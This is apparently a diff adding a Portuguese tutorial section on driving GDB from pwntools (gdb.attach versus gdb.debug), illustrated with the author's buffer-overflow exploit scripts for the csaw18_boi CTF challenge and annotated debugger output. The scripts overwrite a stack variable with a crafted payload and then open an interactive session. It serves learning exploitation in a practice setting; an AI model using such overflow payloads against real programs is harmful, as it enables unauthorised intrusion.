@@ -74,3 +74,124 @@ from pwn import *
 payload = b'A' * 64 + p64(0x401234)
 conn.send(payload)
 ```
+
+## Pwntools com GDB
+
+O pwntools pode ser usado com o gdb, o que facilita demais o processo de investigar e testar binários. 
+
+Uma nota é que o gdb não vai mostrar as abas que ele normalmente mostra quando abrimos um programa com ele. Ele só recebe comandos mesmo.
+
+O mais legal dessa ferramenta é que podemos dar comandos prévios ao gdb: breakpoints, ver rip, continue, ver rbp, etc. Se já sabemos o que quero atacar e analisamos os endereços, basta colocar todos os comandos aqui e eles vão rodar automaticamente quando o script do pwntools for executado. Isso evita ter que digitar os mesmos comandos toda hora. Assim, além do pwntools já dar o nosso input, automatizamos todo o processo de debug. Isso é crazy.
+
+### gdb.attach
+
+Anexa o GDB a um processo já em execução.
+
+Percebi que o `gdb.attach` possui alguns problemas. no teste abaixo, o breakpoint `b *0x004006a0` simplesmente não funcionou. Percebi que os breakpoints só rodam adequadamente APÓS a primeira leitura de input. Imagino que seja porque o GDB está sendo anexado ao processo. Isso significa que o processo já iniciou, e o gdb está chegando no meio da festa. Assim, imagino que o gdb só chega quando o programa já esteja esperando o primeiro input. Com `gdb.debug`, como faremos a frente, tudo correu certo.
+
+O código abaixo foi feito por mim para resolver [csaw18_boi](/docs/pwning/bof/2-1-bof-variables#chall-csaw18_boi). Não se preocupe se você não entender o ataque, apenas veja que podemos abrir o gdb E enviar inputs pelo pwntools para o mesmo programa.
+
+```py
+# exploit.py
+from pwn import *
+
+# Anexa processo (normal)
+p = process('./boi')
+
+'''
+GDB Attach: O processo ./boi já está rodando, só "atracamos" o GDB ao processo.
+
+Percebi que só rodam direito os breakpoints APÓS a primeira leitura de input, não consegui entender o motivo. 
+'''
+gdb.attach(p, '''
+b *0x004006a0
+b *0x004006ad
+x/x $rip
+c
+x/x $rip
+x/x $rbp-0x1c
+c
+x/x $rip
+x/x $rbp-0x1c
+''')
+
+'''
+Buffer Overflow - Variable
+rbp-0x1c (para sobrescrever com 0xcaf3baee)
+rbp-0x30 (input)
+'''
+
+# pwntools envia todos os inputs de uma vez, e o binário vai processando os inputs (mesmo com os breakpoints que colocamos)
+payload = (b'A' * 0x14) + p64(0xcaf3baee)
+p.sendline(payload)
+
+# Sem isso, o processo morre.
+p.interactive()
+```
+
+### gdb.debug
+
+Inicia um novo processo já dentro do GDB desde o início. Precisa que instale `gdbserver` com `sudo apt install gdbserver`. Foi o mais estável que utilizei, não apresenta problemas.
+
+Do mesmo modo que no anterior, o código abaixo foi feito por mim para resolver [csaw18_boi](/docs/pwning/bof/2-1-bof-variables#chall-csaw18_boi). Mas aqui mudamos umas coisinhas, pois o breakpoint 1 funciona. Recomendo utilizar `gdb.debug`, foi o que achei mais estável, já que o processo é iniciado pelo próprio gdb.
+
+```py
+# exploit.py
+from pwn import *
+
+# Percebi que o primeiro breakpoint não roda direito. Na verdade, percebi que só rodam direito os breakpoints após o input. Posso colocar todos os comandos aqui, na verdade.
+p = gdb.debug('./boi', '''
+b *0x004006a0
+b *0x004006ad
+x/x $rip
+c
+x/x $rip
+x/x $rbp-0x1c
+c
+x/x $rip
+x/x $rbp-0x1c
+''')
+
+'''
+rbp-0x1c (para sobrescrever com 0xcaf3baee)
+rbp-0x30 (input)
+'''
+
+# pwntools envia todos os inputs de uma vez, e o arquivo vai processando.
+payload = (b'A' * 0x14) + p64(0xcaf3baee)
+p.sendline(payload)
+
+# Sem isso, o processo morre.
+p.interactive()
+```
+
+Eu disse que o gdb aberto pelo pwntools é mais minimalista (apenas comandos). Abaixo vemos um exemplo da nova janela aberta pelo gdb, e como ele fica.
+
+```bash
+# Introdução do gdb
+Reading symbols from ./boi...
+(No debugging symbols found in ./boi)
+Reading /lib64/ld-linux-x86-64.so.2 from remote target...
+warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
+Reading /lib64/ld-linux-x86-64.so.2 from remote target...
+0x00007f73f082a440 in ?? () from target:/lib64/ld-linux-x86-64.so.2
+
+# Aqui nossos comandos são executados
+Breakpoint 1 at 0x4006a0    # b *0x004006a0
+Breakpoint 2 at 0x4006ad    # b *0x004006ad
+0x7f73f082a440: 0xe8e78948  # x/x $rip (note que o endereço em que estamos é bem diferente dos endereços do código. Isso ocorre pois estamos na libc, que é uma biblioteca dinâmica que vários programas usam ao mesmo tempo)
+Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...
+
+# continue (linhas inteiras sem nada são um continue)
+
+Breakpoint 1, 0x00000000004006a0 in main ()     # breakpoint 1
+0x4006a0 <main+95>:     0xfffe5be8      # x/x $rip
+0x7ffc6a124874: 0xdeadbeef      # x/x $rbp-0x1c
+
+# continue
+
+Breakpoint 2, 0x00000000004006ad in main ()     # breakpoint 2
+0x4006ad <main+108>:    0x7cbf0c75      # x/x $rip
+0x7ffc6a124874: 0xcaf3baee      # x/x $rbp-0x1c
+(gdb)       # Aqui podemos rodar o comando que quisermos
+```
